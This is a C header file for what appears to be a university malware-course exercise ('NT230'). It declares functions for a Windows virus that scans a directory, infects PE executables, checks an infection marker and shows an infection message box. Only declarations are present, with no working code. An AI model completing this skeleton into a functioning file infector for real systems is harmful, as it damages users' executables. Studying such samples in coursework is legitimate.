#ifndef VIRUS_PAYLOAD_H
#define VIRUS_PAYLOAD_H

// Disable Microsoft "security" warnings for standard C functions
// fopen, strcpy, sprintf are part of C standard library
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>

// Infection marker signature to check if a file is already infected
#define INFECTION_MARKER "NT230_INFECTED_VIRUS_PAYLOAD_2025"
#define INFECTION_MARKER_SIZE 33

// Message to display
#define INFECTION_MESSAGE "23521308-23521761-23521828-23521840"
#define WINDOW_TITLE "Infection by NT230"

// Function to display infection message
void DisplayInfectionMessage();

// Function to scan and infect PE files in directory
void InfectPEFilesInDirectory();

// Function to check if file is infected
BOOL IsFileInfected(const char* filename);

// Function to get directory from file path
void GetFileDirectory(const char* filepath, char* directory, size_t max_size);

#endif // VIRUS_PAYLOAD_H
